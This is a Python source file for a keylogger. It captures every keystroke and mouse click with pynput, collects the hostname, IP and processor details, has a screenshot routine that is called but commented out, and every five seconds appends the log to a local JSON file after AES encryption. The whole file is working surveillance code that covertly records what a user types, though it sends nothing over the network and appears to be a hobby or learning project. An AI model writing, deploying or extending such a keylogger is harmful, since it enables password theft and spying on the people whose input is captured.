# imports 

import platform
import socket
from threading import Timer
import pyscreenshot
from pynput import keyboard
from pynput import mouse
import time
from Crypto.Cipher import AES
from key_iv import key
from base64 import b64encode
import json


SEND_REPORT_EVERY = 5 # as in seconds


class RepeatTimer(Timer):  
    def run(self):  
        while not self.finished.wait(self.interval):  
            self.function(*self.args,**self.kwargs)  
            print(' ')  

class KeyLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.log = "\nKeyLogger Started..."

    def appendlog(self, string):
        self.log = self.log + string
        
    def on_click(self,x, y, button, pressed):
        if pressed:
            self.appendlog ('Mouse-clicked-at-[{0}, {1}]-with-{2} '.format(x, y, button))

    def save_data(self, key):
        try:
            current_key = str(key.char)+" "
        except AttributeError:
            if key == key.space:
                current_key = "SPACE "
            elif key == key.esc:
                current_key = "ESC "
            else:
                current_key = str(key) + " "
        self.appendlog(current_key)

    def report(self):
        out = " "+self.log
        self.log = ""
        try:
            file_name = 'logs.json'
            with open(file_name,'r+') as file_object:
                out = bytes(out, 'utf-8')
                cipher1 = AES.new(key, AES.MODE_CTR)

                ct_bytes = cipher1.encrypt(out) # returns  byte like objects
                nonce = b64encode(cipher1.nonce).decode('utf-8') # converts each byte character to string
                ct = b64encode(ct_bytes).decode('utf-8')
                data = {'nonce':nonce, 'ciphertext':ct}

                file_data = json.load(file_object)
                file_data.append(data)
                file_object.seek(0)
                json.dump(file_data, file_object, indent = 4)

        except Exception as e:
            print('Something went wrong: {}'.format(e))
        finally:
            file_object.close()
        
    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog("\nHostname: {}".format(hostname))
        self.appendlog("\nIP: {}".format(ip))
        self.appendlog("\nPlatform: {}".format(plat))
        self.appendlog("\nSystem: {}".format(system))
        self.appendlog("\nMachine: {}".format(machine))

    def screenshot(self):
        img = pyscreenshot.grab()
        img.show()

    def run(self):
            # self.screenshot()
            self.system_information()
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            mouse_listener = mouse.Listener(on_click=self.on_click)

            keyboard_listener.start()
            mouse_listener.start()
            
            self.report()
            timer = RepeatTimer(5,self.report)
            timer.start() #recalling run  
            print('\nLogging started')  
            time.sleep(25)#It gets suspended for the given number of seconds  
            print('Logging finished')
            timer.cancel()
            
            mouse_listener.join()
            keyboard_listener.join()

if __name__ == '__main__':

    keylogger = KeyLogger(SEND_REPORT_EVERY)
    keylogger.run()